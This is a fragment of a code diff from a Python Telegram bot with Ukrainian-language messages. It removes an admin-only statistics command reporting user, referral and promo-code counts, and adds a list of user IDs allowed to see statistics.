-            active_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes WHERE is_active = TRUE AND valid_until > $1', datetime.now())
-            promo_activations = await conn.fetchval('SELECT COUNT(*) FROM promo_activations')
-        message_text = (
-            f"📊 <b>Статистика бота</b>\n\n"
-            f"👥 Всього користувачів: {total_users}\n"
-            f"✅ Активних користувачів: {active_users}\n"
-            f"🚫 Заблокованих користувачів: {blocked_users}\n"
-            f"📈 Користувачів з рефералами: {users_with_referrals}\n"
-            f"🔗 Всього рефералів: {total_referrals}\n"
-            f"⭐ VIP користувачів (20+ рефералів): {vip_users}\n\n"
-            f"🎁 <b>Промокоди:</b>\n"
-            f"📋 Всього створено: {total_promos}\n"
-            f"🟢 Активних: {active_promos}\n"
-            f"✨ Активацій: {promo_activations}"
-        )
-        await message.answer(message_text, parse_mode="HTML")
-    else:
-        await message.answer("Недостатньо прав.")
+USER_STATS_ALLOWED = [810944378]
 
 if __name__ == '__main__':
     logging.info("Запуск бота...")
